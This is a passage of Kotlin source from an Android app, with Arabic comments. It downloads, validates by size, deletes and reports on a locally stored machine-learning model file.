                        MainActivity.appendLogStatic("❌ Downloaded model file is invalid or corrupted")
                        withContext(Dispatchers.Main) {
                            onError("Downloaded model file is invalid or corrupted")
                        }
                    }
                } else {
                    Log.e(TAG, "❌ Failed to download model")
                    MainActivity.appendLogStatic("❌ Failed to download model")
                    withContext(Dispatchers.Main) {
                        onError("Failed to download model from server")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "❌ Model download error: ${e.message}")
                MainActivity.appendLogStatic("❌ Model download error: ${e.message}")
                withContext(Dispatchers.Main) {
                    onError("Error downloading model: ${e.message}")
                }
            }
        }
    }

    /**
     * تحميل النموذج بشكل متزامن (محظور - يُستخدم في حالات خاصة).
     *
     * ✅ تم إصلاح الخطأ: استخدام runBlocking لاستدعاء الدالة المعلقة downloadModelWithRetry
     *
     * @return مسار الملف المحمّل، أو null في حالة الفشل
     */
    fun downloadModelSync(context: Context): File? {
        return try {
            val modelFile = getModelFile(context)

            if (modelFile.exists() && modelFile.length() > 5_000_000) {
                Log.i(TAG, "✅ Model already exists (sync): ${modelFile.absolutePath}")
                return modelFile
            }

            Log.i(TAG, "📥 Downloading model synchronously...")

            val fileDownloader = FileDownloader(context)
            // ✅ استخدام runBlocking لاستدعاء الدالة المعلقة
            val success = runBlocking {
                fileDownloader.downloadModelWithRetry(
                    url = MODEL_URL,
                    destinationFile = modelFile,
                    expectedSize = 10884710,
                    isBase64 = false,
                    maxRetries = 3
                )
            }

            if (success && modelFile.exists() && modelFile.length() > 5_000_000) {
                Log.i(TAG, "✅ Model downloaded successfully (sync): ${modelFile.length()} bytes")
                if (validateModelFile(modelFile)) {
                    return modelFile
                } else {
                    modelFile.delete()
                    null
                }
            } else {
                null
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Sync download error: ${e.message}")
            null
        }
    }

    /**
     * حذف النموذج المحلي (لإعادة التحميل).
     * @return true إذا تم الحذف بنجاح
     */
    fun deleteModel(context: Context): Boolean {
        val modelFile = getModelFile(context)
        return if (modelFile.exists()) {
            val deleted = modelFile.delete()
            if (deleted) {
                Log.i(TAG, "🗑️ Model deleted successfully")
                MainActivity.appendLogStatic("🗑️ Model deleted successfully")
            } else {
                Log.w(TAG, "⚠️ Failed to delete model")
            }
            deleted
        } else {
            Log.d(TAG, "Model does not exist, nothing to delete")
            true
        }
    }

    /**
     * الحصول على معلومات النموذج.
     * @return Map تحتوي على معلومات الملف (الحجم، التاريخ، المسار)
     */
    fun getModelInfo(context: Context): Map<String, Any> {
        val modelFile = getModelFile(context)
        return mapOf(
            "exists" to modelFile.exists(),
            "path" to modelFile.absolutePath,
            "size_bytes" to (if (modelFile.exists()) modelFile.length() else 0L),
            "size_mb" to (if (modelFile.exists()) String.format("%.2f", modelFile.length() / (1024.0 * 1024.0)) else "0.00"),
            "last_modified" to (if (modelFile.exists()) modelFile.lastModified() else 0L),
            "is_valid" to (modelFile.exists() && modelFile.length() > 5_000_000)
        )
    }
}
